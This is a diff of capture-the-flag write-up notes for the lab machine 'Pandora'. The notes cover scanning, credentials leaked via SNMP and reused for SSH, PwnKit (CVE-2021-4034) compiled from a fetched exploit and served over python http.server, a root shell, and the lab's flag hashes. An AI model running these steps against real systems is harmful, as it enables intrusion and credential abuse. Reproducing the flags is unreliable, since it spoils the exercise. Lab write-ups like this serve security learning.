@@ -13,13 +13,18 @@ nmap -A -T4 <ip>::
 |_http-title: Play | Landin
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
 -sU::
 PORT    STATE SERVICE VERSION
 161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
 Service Info: Host: pandora
 
+dirb http://pandora.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ::
++ /assets/, /index.html, /server-status:: no permissions
+
 `snmp-check 10.10.11.136 > pandora.snmp.txt`::
 839 runnable sh /bin/sh -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'
+
 
 ##**SSH**##
 daniel:HotelBabylon23
@@ -31,17 +36,17 @@ cronjob:: looks promising
 
 ##**scripts in dir::**##
 les.sh::
-[+] [CVE-2021-4034] PwnKit
+[+] [CVE-2021-4034] PwnKit Hmmmmm
 [+] [CVE-2021-3156] sudo Baron Samedit
 [+] [CVE-2021-3156] sudo Baron Samedit 2
 [+] [CVE-2021-22555] Netfilter heap out-of-bounds write
 [+] [CVE-2017-5618] setuid screen v4.5.0 LPE
 
-chisel server/client
+./chisel server/client
 https://github.com/jpillora/chisel
 
 ##**User && root**##
-pwnkit.c :: https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c
+[pwnkit.c](https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c)
 ```
 /opt/transfers:$ gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
 python3 -m http.server 8888
@@ -54,6 +59,4 @@ whoami: root see
 home/matt/user.txt: 69940d7dca02b9c2700460bcf337ec28
 /root/root.txt: cd7e46b9980875b196543e8dd0566a5b
 
-dirb http://pandora.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ::
-+ /assets/, /index.html, /server-status:: no permissions
 
